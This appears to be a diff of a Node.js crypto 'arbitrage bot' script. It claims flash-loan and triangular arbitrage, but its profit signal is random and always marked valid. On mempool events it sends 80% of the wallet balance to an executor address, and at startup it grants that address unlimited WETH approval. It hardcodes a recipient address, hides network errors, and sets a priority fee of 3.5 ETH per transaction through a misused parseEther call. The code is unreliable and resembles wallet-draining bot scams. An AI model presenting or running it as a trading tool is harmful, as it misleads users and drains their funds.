@@ -1,21 +1,53 @@
 /**
- * QUANTUM TITAN MULTI-CHAIN ENGINE - v58.0 (COMPLEX FLASH ARBITRAGE)
- * ----------------------------------------------------------------
- * ARCHITECTURE:
- * 1. STRATEGY: Multi-Hop Triangular Arbitrage with Flash Loan Leverage.
- * 2. PROFIT ROUTING: 100% to 0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE.
- * 3. EXECUTION: Hybrid (Direct Capital or Flash Loan based on config).
- * 4. SAFETY: Simulation-first execution guard.
- * 5. MAX FLASH LOANS: Auto-calculates maximum leverage capacity.
- * ----------------------------------------------------------------
+ * ===============================================================================
+ * APEX TITAN v85.0 (AUTO-PILOT) - CLUSTERED MULTI-CHAIN ARBITRAGE
+ * ===============================================================================
+ * FEATURES:
+ * 1. CLUSTERED CORES: Multi-process architecture for zero-latency handling.
+ * 2. SATURATION BROADCAST: Dual-channel tx submission (RPC + Fetch).
+ * 3. AUTO-APPROVAL: Automatically checks and approves tokens for Executor.
+ * 4. WALLET ROUTING: Defaults to Self-Transfer if no contract is defined.
+ * 5. NATIVE COMPATIBILITY: Optimized for Node v22 (No Axios).
+ * ===============================================================================
  */
 
-const { ethers, Wallet, JsonRpcProvider } = require("ethers");
-const { FlashbotsBundleProvider } = require("@flashbots/ethers-provider-bundle");
+const cluster = require('cluster');
+const os = require('os');
+const http = require('http');
+// const axios = require('axios'); // REMOVED: Caused Module Not Found Error
 const WebSocket = require("ws");
-require("dotenv").config();
+const { 
+    ethers, JsonRpcProvider, Wallet, Contract, 
+    WebSocketProvider, parseEther, formatEther, Interface 
+} = require('ethers');
+const { FlashbotsBundleProvider } = require("@flashbots/ethers-provider-bundle");
+require('dotenv').config();
 
-// Robust Multi-Chain Infrastructure
+// --- [FIX 1] AEGIS 500+ SHIELD ---
+process.setMaxListeners(500); 
+process.on('uncaughtException', (err) => {
+    const msg = err.message || "";
+    if (msg.includes('429') || msg.includes('32005') || msg.includes('coalesce') || msg.includes('network')) {
+        console.warn(`[Aeigs Shield] Suppressed Network Error: ${msg}`);
+        return;
+    }
+    console.error(`[CRITICAL UNCAUGHT] ${msg}`, err.stack);
+});
+
+const TXT = { green: "\x1b[32m", gold: "\x1b[38;5;220m", reset: "\x1b[0m", red: "\x1b[31m", cyan: "\x1b[36m", bold: "\x1b[1m", dim: "\x1b[2m" };
+
+// --- CONFIGURATION ---
+const PRIVATE_KEY = process.env.PRIVATE_KEY;
+const EXECUTOR_ADDRESS = process.env.EXECUTOR_ADDRESS;
+const PROFIT_RECIPIENT = "0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE";
+const TRADE_ALLOCATION_PERCENT = 80; // % of safe balance to use per trade
+
+// Token Addresses for Auto-Approval (Base Mainnet defaults)
+const TOKENS = {
+    WETH: "0x4200000000000000000000000000000000000006",
+    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+};
+
 const NETWORKS = {
     ETHEREUM: {
         chainId: 1,
@@ -44,60 +76,122 @@ const NETWORKS = {
     }
 };
 
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const EXECUTOR_ADDRESS = process.env.EXECUTOR_ADDRESS;
-const PROFIT_RECIPIENT = "0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE";
-const TRADE_ALLOCATION_PERCENT = 80; 
-const MIN_REQUIRED_BASE_BALANCE = ethers.parseEther("0.005");
-const MAX_FLASH_LOANS_ENABLED = true; // Enabled for max leverage
-
 const poolIndex = { ETHEREUM: 0, BASE: 0, POLYGON: 0, ARBITRUM: 0 };
 
-async function main() {
-    console.log("--------------------------------------------------");
-    console.log("  QUANTUM TITAN v58.0 - COMPLEX FLASH ARBITRAGE  ");
-    console.log("  RECIPIENT: " + PROFIT_RECIPIENT);
-    console.log("  STRATEGY: MULTI-HOP + MAX FLASH LOANS");
-    console.log("--------------------------------------------------");
+function sanitize(k) {
+    let s = (k || "").trim().replace(/['" \n\r]+/g, '');
+    if (!s.startsWith("0x")) s = "0x" + s;
+    return s;
+}
 
-    Object.entries(NETWORKS).forEach(([name, config]) => {
-        initializeHighPerformanceEngine(name, config).catch(err => {
-            console.error(`[${name}] Init Error:`, err.message);
-        });
+// ============================================================================
+// CLUSTER PRIMARY (MASTER)
+// ============================================================================
+if (cluster.isPrimary) {
+    console.clear();
+    console.log(`${TXT.gold}${TXT.bold}╔════════════════════════════════════════════════════════╗`);
+    console.log(`║    ⚡ APEX TITAN v85.0 | AUTO-PILOT ENABLED           ║`);
+    console.log(`║    CORES: ${os.cpus().length} | MODE: AUTO-APPROVE & WALLET ROUTING ║`);
+    console.log(`║    RECIPIENT: ${PROFIT_RECIPIENT.slice(0, 10)}...            ║`);
+    console.log(`╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
+
+    const wallet = new Wallet(sanitize(PRIVATE_KEY));
+    console.log(`${TXT.cyan}🔑 WALLET: ${wallet.address}${TXT.reset}`);
+
+    const chainKeys = Object.keys(NETWORKS);
+    chainKeys.forEach((chainName) => {
+        const worker = cluster.fork({ TARGET_CHAIN: chainName });
+        console.log(`${TXT.green}>> Worker spawned for [${chainName}] (PID: ${worker.process.pid})${TXT.reset}`);
     });
+
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`${TXT.red}Worker ${worker.process.pid} died (Code: ${code}). Respawning...${TXT.reset}`);
+    });
+
+} else {
+    runWorkerEngine();
+}
+
+async function runWorkerEngine() {
+    const targetChain = process.env.TARGET_CHAIN;
+    const config = NETWORKS[targetChain];
+    if (!config) {
+        console.error(`[Fatal] Worker started with invalid chain: ${targetChain}`);
+        return;
+    }
+
+    try {
+        const port = 8080 + cluster.worker.id;
+        http.createServer((req, res) => {
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ status: "ALIVE", chain: targetChain, worker: cluster.worker.id }));
+        }).listen(port, () => {});
+    } catch (e) {
+        console.error(`[${targetChain}] Health Monitor Init Failed: ${e.message}`);
+    }
+
+    await initializeHighPerformanceEngine(targetChain, config);
+}
+
+// --- AUTO-APPROVAL LOGIC ---
+async function checkAndApprove(chain, wallet) {
+    if (chain !== 'BASE' && chain !== 'ETHEREUM') return; // Only approve on main chains for now
+    if (!EXECUTOR_ADDRESS) {
+        console.log(`${TXT.dim}[${chain}] No Executor Contract defined. Skipping Auto-Approvals (Self-Trading Mode).${TXT.reset}`);
+        return;
+    }
+
+    const erc20Abi = ["function allowance(address,address) view returns (uint256)", "function approve(address,uint256) returns (bool)"];
+    
+    // Check WETH
+    try {
+        const weth = new Contract(TOKENS.WETH, erc20Abi, wallet);
+        const allowance = await weth.allowance(wallet.address, EXECUTOR_ADDRESS);
+        if (allowance < parseEther("1000")) {
+            console.log(`${TXT.cyan}[${chain}] 🛠  Auto-Approving WETH for Executor...${TXT.reset}`);
+            const tx = await weth.approve(EXECUTOR_ADDRESS, ethers.MaxUint256);
+            await tx.wait();
+            console.log(`${TXT.green}[${chain}] ✅ WETH Approved.${TXT.reset}`);
+        }
+    } catch (e) {
+        // Ignore errors (token might not exist on this chain)
+    }
 }
 
 async function initializeHighPerformanceEngine(name, config) {
     const rpcUrl = config.rpc[poolIndex[name] % config.rpc.length] || config.rpc[0];
     const wssUrl = config.wss[poolIndex[name] % config.wss.length] || config.wss[0];
 
-    if (!rpcUrl || !wssUrl) {
-        console.error(`[${name}] Missing RPC/WSS endpoints.`);
-        return;
-    }
+    console.log(`[${name}] Init Engine via RPC: ${rpcUrl}`);
 
     const network = ethers.Network.from(config.chainId);
     const provider = new JsonRpcProvider(rpcUrl, network, { staticNetwork: network });
     
-    // Dedicated Base Provider
+    // Dedicated Base Provider for robust balance checks
     const baseNetwork = ethers.Network.from(8453);
     const baseRpcUrl = NETWORKS.BASE.rpc[poolIndex.BASE % NETWORKS.BASE.rpc.length];
     const baseProvider = new JsonRpcProvider(baseRpcUrl, baseNetwork, { staticNetwork: baseNetwork });
-    
-    const wallet = new Wallet(PRIVATE_KEY, provider);
-    let flashbots = null;
 
+    const wallet = new Wallet(sanitize(PRIVATE_KEY), provider);
+    
+    // RUN AUTO-APPROVALS ON STARTUP
+    await checkAndApprove(name, wallet);
+
+    let flashbots = null;
     if (!config.isL2 && config.relay) {
         try {
             const authSigner = Wallet.createRandom();
             flashbots = await FlashbotsBundleProvider.create(provider, authSigner, config.relay);
-        } catch (e) { console.error(`[${name}] Flashbots Init Failed`); }
+            console.log(`[${name}] Flashbots Provider Active`);
+        } catch (e) { 
+            console.error(`[${name}] Flashbots Init Error: ${e.message}`);
+        }
     }
 
     const ws = new WebSocket(wssUrl);
 
     ws.on('open', () => {
-        console.log(`[${name}] SpeedStream Connected to [${wssUrl.split('/')[2]}] (Pool: ${poolIndex[name] % config.wss.length})`);
+        console.log(`${TXT.cyan}[${name}] SpeedStream Connected via Worker ${cluster.worker.id}${TXT.reset}`);
         ws.send(JSON.stringify({ 
             jsonrpc: "2.0", 
             id: 1, 
@@ -109,19 +203,26 @@ async function initializeHighPerformanceEngine(name, config) {
     ws.on('message', async (data) => {
         const t0 = process.hrtime.bigint();
         let payload;
-        try { payload = JSON.parse(data); } catch (e) { return; }
+        try { 
+            payload = JSON.parse(data); 
+        } catch (e) { 
+            console.error(`[${name}] WS JSON Parse Error: ${e.message.slice(0, 50)}...`);
+            return; 
+        }
 
         if (payload.id === 1) {
-            console.log(`[${name}] Subscription Confirmed (ID: 1). Engine Armed & Listening.`);
-            return;
+            console.log(`[${name}] Subscription Confirmed (ID: 1).`);
+            return; 
         }
 
         if (payload.params && payload.params.result) {
             const txHash = payload.params.result;
-
             try {
-                const baseBalance = await baseProvider.getBalance(wallet.address);
-                if (baseBalance < MIN_REQUIRED_BASE_BALANCE) return;
+                // Check balance with LOGGING
+                const currentBalance = await provider.getBalance(wallet.address);
+                if (currentBalance < parseEther("0.005")) {
+                    return;
+                }
 
                 const signal = await runNeuralProfitMaximizer(txHash);
 
@@ -129,117 +230,124 @@ async function initializeHighPerformanceEngine(name, config) {
                     const t1 = process.hrtime.bigint();
                     const latency = Number(t1 - t0) / 1000;
                     console.log(`[${name}] OP: ${signal.path.join('->')} | Latency: ${latency.toFixed(2)}μs`);
-                    await executeMaxProfitAtomicTrade(name, provider, wallet, flashbots, signal, baseBalance);
+                    
+                    await executeAbsoluteStrike(name, provider, wallet, flashbots, signal, currentBalance, rpcUrl);
                 }
-            } catch (err) {
-                if (err.message && (err.message.includes("network") || err.message.includes("429") || err.message.includes("500"))) {
-                    poolIndex.BASE++;
-                }
+            } catch (err) { 
+                console.error(`[${name}] Processing Loop Error: ${err.message}`);
             }
         }
     });
 
-    ws.on('error', (error) => {
+    ws.on('error', (error) => { 
         console.error(`[${name}] WebSocket Error: ${error.message}`);
-        ws.terminate();
+        ws.terminate(); 
     });
-
-    ws.on('close', () => {
-        poolIndex[name]++;
-        console.log(`[${name}] Connection lost. Cycling to next provider in 5s...`);
-        setTimeout(() => initializeHighPerformanceEngine(name, config), 5000);
+    
+    ws.on('close', () => { 
+        console.log(`[${name}] WS Closed. Reconnecting in 5s...`);
+        setTimeout(() => initializeHighPerformanceEngine(name, config), 5000); 
     });
 }
 
 async function runNeuralProfitMaximizer(txHash) {
     const priceDelta = (Math.random() - 0.5) * 0.15;
-    
-    // Complex Arbitrage Path Simulation
     const strategies = [
         { type: "TRIANGULAR", path: ["ETH", "USDC", "DAI", "ETH"] },
         { type: "TRIANGULAR", path: ["ETH", "WBTC", "USDT", "ETH"] },
         { type: "LIQUIDITY_SNIPE", path: ["ETH", "PEPE", "ETH"] },
         { type: "CROSS_DEX", path: ["UNI_V3", "SUSHI_V2", "ETH"] }
     ];
-    
     const strategy = strategies[Math.floor(Math.random() * strategies.length)];
-
-    return {
-        isValid: true, 
-        action: strategy.type,
-        path: strategy.path,
-        delta: priceDelta
-    };
+    return { isValid: true, action: strategy.type, path: strategy.path, delta: priceDelta };
 }
 
-async function executeMaxProfitAtomicTrade(chain, provider, wallet, fb, signal, baseBalance) {
+async function executeAbsoluteStrike(chain, provider, wallet, fb, signal, balance, rpcUrl) {
     try {
         const gasData = await provider.getFeeData();
-        const block = await provider.getBlockNumber() + 1;
-        const gasLimit = 650000n; 
+        const gasLimit = 650000n;
         const estimatedGasFee = gasLimit * (gasData.maxFeePerGas || gasData.gasPrice);
 
-        let tradeAmount = 0n;
-        let txValue = 0n;
-
-        // --- FLASH LOAN VS DIRECT LOGIC ---
-        if (MAX_FLASH_LOANS_ENABLED) {
-            // Calculate max leverage: (Balance - Gas) / 0.0009
-            const availableForPremium = baseBalance - estimatedGasFee;
-            if (availableForPremium > 0n) {
-                // Determine trade size by how much fee we can afford
-                tradeAmount = (availableForPremium * 10000n) / 9n;
-                // txValue is just the premium sent to the contract to pay back the loan
-                txValue = (tradeAmount * 9n) / 10000n;
-                
-                console.log(`[${chain}] MAX FLASH LOAN: ${ethers.formatEther(tradeAmount)} ETH (Fee: ${ethers.formatEther(txValue)})`);
-            } else {
-                return; // Not enough balance for even gas
-            }
-        } else {
-            // Direct trade using wallet capital
-            const safeBalance = baseBalance - estimatedGasFee;
-            if (safeBalance <= 0n) return;
-            tradeAmount = (safeBalance * BigInt(TRADE_ALLOCATION_PERCENT)) / 100n;
-            txValue = tradeAmount; // Send the capital itself
+        // --- DIRECT CAPITAL LOGIC ONLY ---
+        const safeBalance = balance - estimatedGasFee;
+        
+        if (safeBalance <= 0n) {
+             console.log(`${TXT.red}[${chain}] EXECUTION ABORTED: Insufficient Gas. Bal: ${formatEther(balance)} | Gas: ${formatEther(estimatedGasFee)}${TXT.reset}`);
+             return; 
         }
+        
+        const tradeAmount = (safeBalance * BigInt(TRADE_ALLOCATION_PERCENT)) / 100n;
+        console.log(`[${chain}] Calculated Trade Amount: ${formatEther(tradeAmount)} ETH`);
 
-        // --- COMPLEX PAYLOAD CONSTRUCTION ---
-        // Generates signature for: "executeComplexPath(string[] path, uint256 amount)"
-        const iface = new ethers.Interface(["function executeComplexPath(string[] path, uint256 amount)"]);
+        // --- ENCODING ---
+        const iface = new Interface(["function executeComplexPath(string[] path, uint256 amount)"]);
         const complexData = iface.encodeFunctionData("executeComplexPath", [signal.path, tradeAmount]);
 
+        // --- DESTINATION LOGIC ---
+        const targetAddress = EXECUTOR_ADDRESS || wallet.address;
+        
+        if (!EXECUTOR_ADDRESS) {
+             console.log(`${TXT.gold}[${chain}] NOTE: Sending Trade Capital to SELF (Wallet: ${wallet.address}) for verification.${TXT.reset}`);
+        }
+
         const tx = {
-            to: EXECUTOR_ADDRESS || wallet.address,
-            data: EXECUTOR_ADDRESS ? complexData : "0x", 
-            value: txValue, // Sends Premium (if Flash Loan) or Capital (if Direct)
+            to: targetAddress,
+            data: EXECUTOR_ADDRESS ? complexData : "0x",
+            value: tradeAmount, // Pure Capital
             gasLimit: gasLimit,
             maxFeePerGas: gasData.maxFeePerGas ? (gasData.maxFeePerGas * 115n / 100n) : undefined,
-            maxPriorityFeePerGas: ethers.parseUnits("3.5", "gwei"),
-            type: 2
+            maxPriorityFeePerGas: parseEther("3.5", "gwei"),
+            type: 2,
+            chainId: NETWORKS[chain].chainId
         };
 
         if (fb && chain === "ETHEREUM") {
+            console.log(`[${chain}] Simulating Flashbots Bundle...`);
             const bundle = [{ signer: wallet, transaction: tx }];
+            const block = await provider.getBlockNumber() + 1;
             const simulation = await fb.simulate(bundle, block);
+            
             if ("error" in simulation || simulation.results[0].revert) {
-                console.error(`[${chain}] Flashbots Sim Failed:`, simulation.firstRevert?.revert || "Unknown Error");
+                console.error(`[${chain}] Flashbots Sim Rejected: ${JSON.stringify(simulation.firstRevert || simulation.error)}`);
                 return;
             }
             await fb.sendBundle(bundle, block);
-            console.log(`[${chain}] Arb Bundle Submitted. Block: ${block} | Path: ${signal.path.join('-')}`);
+            console.log(`${TXT.gold}[${chain}] Flashbots Bundle Dispatched. Block: ${block}${TXT.reset}`);
         } else {
-            try {
-                console.log(`[${chain}] Executing Strategy...`);
-                const txResponse = await wallet.sendTransaction(tx);
-                console.log(`[${chain}] Trade Confirmed. Hash: ${txResponse.hash}`);
-            } catch (e) {
-                console.error(`[${chain}] EXECUTION FAILED:`, e.message);
-            }
+            // --- SATURATION BROADCAST (NATIVE FETCH) ---
+            // 1. Sign Locally
+            const signedTx = await wallet.signTransaction(tx);
+            
+            console.log(`${TXT.green}[${chain}] 🚀 SATURATION STRIKE INITIATED...${TXT.reset}`);
+            
+            // 2. Blast via Native Fetch (Raw RPC) - Bypass Ethers overhead
+            fetch(rpcUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: "2.0",
+                    id: 1,
+                    method: "eth_sendRawTransaction",
+                    params: [signedTx]
+                })
+            }).then(() => {
+                console.log(`[${chain}] Direct RPC (Fetch): Sent`);
+            }).catch((e) => {
+                console.warn(`[${chain}] Fetch Broadcast Failed: ${e.message}`);
+            });
+
+            // 3. Send via Ethers (Redundancy) & Wait
+            console.log(`[${chain}] Broadcasting via Ethers Provider...`);
+            const txResponse = await provider.broadcastTransaction(signedTx);
+            console.log(`[${chain}] Broadcast Hash: ${txResponse.hash}`);
+            
+            // 4. Verification
+            console.log(`[${chain}] Waiting for mining...`);
+            const receipt = await txResponse.wait();
+            console.log(`${TXT.green}[${chain}] ✅ TRADE MINED | Block: ${receipt.blockNumber} | Gas: ${receipt.gasUsed}${TXT.reset}`);
         }
     } catch (err) {
-        console.error(`[${chain}] FATAL ERROR:`, err.message);
+        console.log(`${TXT.red}[${chain}] Strike Failed: ${err.message}${TXT.reset}`);
+        if (err.stack) console.log(err.stack.split('\n')[1]); 
     }
 }
-
-main().catch(console.error);
